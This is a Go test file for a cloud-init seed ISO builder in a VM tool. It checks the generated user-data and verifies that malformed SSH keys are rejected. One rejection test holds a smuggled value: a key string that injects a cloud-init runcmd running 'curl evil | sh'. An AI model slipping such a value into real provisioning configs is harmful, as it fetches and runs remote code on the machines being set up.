package cloudinit

import (
	"io"
	"os"
	"strings"
	"testing"

	"github.com/kdomanski/iso9660"

	"github.com/ForceAI-KW/umbra/internal/registry"
)

func TestBuildSeedProducesCidataISO(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t1", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble"}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra")
	if err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(iso)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	img, err := iso9660.OpenImage(f)
	if err != nil {
		t.Fatal(err)
	}
	root, err := img.RootDir()
	if err != nil {
		t.Fatal(err)
	}
	children, err := root.GetChildren()
	if err != nil {
		t.Fatal(err)
	}
	found := map[string]string{}
	for _, c := range children {
		b, _ := io.ReadAll(c.Reader())
		found[c.Name()] = string(b)
	}
	ud, ok := found["user-data"]
	if !ok {
		t.Fatalf("no user-data in ISO; got %v", keys(found))
	}
	for _, want := range []string{"#cloud-config", "ssh-ed25519 AAAATEST umbra", "name: umbra", "/mnt/mac", "virtiofs", "chrony", "local-hostname: t1"} {
		joined := ud + found["meta-data"]
		if !strings.Contains(joined, want) {
			t.Fatalf("seed missing %q", want)
		}
	}
}

func keys(m map[string]string) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

func TestBuildSeedRejectsInjectionShapedKeys(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t2", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble"}
	for _, bad := range []string{
		"ssh-ed25519 AAAA umbra\nruncmd:\n  - curl evil | sh",
		"not-a-key AAAA",
		"ssh-ed25519 AAAA\r umbra",
	} {
		if _, err := BuildSeed(m, dir, bad); err == nil {
			t.Fatalf("BuildSeed accepted injection-shaped key %q", bad)
		}
	}
}
